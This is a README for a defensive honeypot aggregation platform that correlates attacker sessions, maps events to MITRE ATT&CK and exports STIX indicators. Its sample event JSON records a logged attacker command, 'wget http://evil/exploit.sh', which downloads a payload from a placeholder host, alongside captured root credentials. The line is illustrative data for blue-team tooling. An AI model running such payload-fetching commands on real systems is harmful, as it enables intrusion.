# Canary

> HoneyNet — Centralized Honeypot Aggregation & MITRE ATT&CK Threat Correlation Platform

[![Python 3.10+](https://img.shields.io/badge/Python-3.10%2B-3776ab.svg)](https://python.org)
[![License: MIT](https://img.shields.io/badge/License-MIT-00ff41.svg)](LICENSE)
[![Security](https://img.shields.io/badge/Security-CyberSec-ff0040.svg)](https://github.com/s1d9e/canary)

---

Canary unifies events from multiple honeypots (blood-web, voltron-ssh, Backrooms, Cowrie, Dionaea) into a single centralized threat-intelligence platform. It correlates attacker sessions *across* honeypots, maps them to MITRE ATT&CK techniques, fingerprints attacker tooling, and exports IOC/STIX.

## Why Canary?

You run several isolated honeypots — but each writes its own log format into its own database. Canary is the **correlation layer** that turns standalone deceptions into actionable threat intel: the same attacker bouncing between your SSH honeypot and your web honeypot becomes one single tracked session, not two unconnected rows.

## Features

| Feature | Description |
|---------|-------------|
| **Unified Ingestion API** | Standard JSON/CEF endpoint accepting events from blood-web, voltron-ssh, Backrooms, Cowrie, and any custom honeypot |
| **Cross-Honeypot Correlation** | Reassembles attacker sessions spanning multiple services via IP/IPv6/ASN + user-agent + auth fingerprinting |
| **ATT&CK Mapping** | Every raw event auto-mapped to MITRE ATT&CK tactics & techniques |
| **Tooling Fingerprinting** | Identifies common scanner/exploit frameworks (nuclei, sqlmap, nmap, metasploit...) |
| **Attacker Scoring** | XP-like risk score per attacker across the whole deception network |
| **Rich TUI + Web Dashboard** | Real-time terminal dashboard and a Flask web UI |
| **IOC / STIX2 Export** | Export observables as CSV, JSON, and STIX 2.1 bundles |
| **Fully defensive** | Blue-team oriented: passive aggregation & analysis only |
| **CI-ready** | pytest, ruff, mypy — matches your existing quality bar |

## Installation

```bash
git clone https://github.com/s1d9e/canary.git
cd canary
pip install -e .
```

## Quickstart

```bash
# Initialize the SQLite database and default config
canary init

# Start the ingestion API (default http://127.0.0.1:8080/)
canary serve

# (or) Start the read-only Flask dashboard (default http://127.0.0.1:5000/)
canary web

# Ingest a honeypot event from a file or inline JSON
canary ingest ./event.json

# Live Rich TUI
canary tui
```

### Pointing a honeypot at Canary

Each honeypot posts events to the ingestion endpoint `POST /api/v1/events` with a JSON body like:

```json
{
  "honeypot": "blood-web",
  "protocol": "ssh",
  "src_ip": "203.0.113.7",
  "src_port": 51234,
  "dst_ip": "10.0.0.5",
  "dst_port": 22,
  "timestamp": "2026-09-07T12:34:56Z",
  "session_id": "b3f1...",
  "username": "root",
  "password": "toor",
  "command": "wget http://evil/exploit.sh",
  "raw": "login attempt root:toor"
}
```

## CLI

```bash
# Start the ingestion API (default 127.0.0.1:8080)
canary serve --host 0.0.0.0 --port 8080
# Require an API token on the ingestion endpoint
canary serve --token s3cret

# Start the Flask dashboard (read-only, default 127.0.0.1:5000)
canary web

# Interactive terminal dashboard (live correlation view)
canary tui --refresh 5

# Show top attackers by risk score
canary top --limit 10

# Show a full attacker profile + ATT&CK coverage
canary profile 203.0.113.7

# Export IOCs
canary export stix --name iocs
canary export csv --name attackers
```

## Project Structure

```
canary/
├── canary/
│   ├── __init__.py          # Version info
│   ├── __main__.py          # python -m canary
│   ├── cli/
│   │   ├── main.py          # Typer CLI app
│   │   └── dashboard.py     # Rich TUI (live view)
│   ├── core/
│   │   ├── models.py        # Pydantic event/session models
│   │   ├── db.py            # SQLAlchemy async + SQLite
│   │   ├── config.py        # YAML config
│   │   └── errors.py        # Custom exceptions
│   ├── ingest/
│   │   ├── api.py           # HTTP ingestion endpoint (aiohttp server)
│   │   ├── normalizer.py    # blood-web / voltron-ssh / backrooms / cowrie parsers
│   │   └── pipeline.py      # End-to-end ingestion pipeline
│   ├── correlate/
│   │   ├── engine.py        # Session correlation engine
│   │   ├── score.py         # Attacker risk scoring
│   │   └── fingerprint.py   # Tooling fingerprinting
│   ├── attack/
│   │   ├── matrix.py        # MITRE ATT&CK mapping
│   │   └── rules.py         # Technique detection rules
│   ├── export/
│   │   ├── stix.py          # STIX 2.1 bundle generator
│   │   └── csv.py           # CSV export
│   └── web/
│       ├── server.py        # Flask dashboard app
│       └── templates/       # Dashboard HTML
├── tests/
├── pyproject.toml
├── Makefile
├── Dockerfile
└── README.md
```

## Development

```bash
make dev     # install with dev deps
make test    # run pytest
make lint    # ruff check
make format  # ruff format
make typecheck  # mypy
```

## Security / Etiquette

Canary is a **defensive** aggregation platform. It does not attack anything; it observes traffic that has already been directed at your own honeypots. Deploy it on your own infrastructure, in your own lab, or on assets you own. Do not point deception infrastructure at third parties. See [LEGAL.md](LEGAL.md).

## License

MIT License — see [LICENSE](LICENSE) for details.

---

<p align="center">
  Made with <span style="color: #ff0040;">&#9829;</span> by <b>s1d9e</b>
</p>
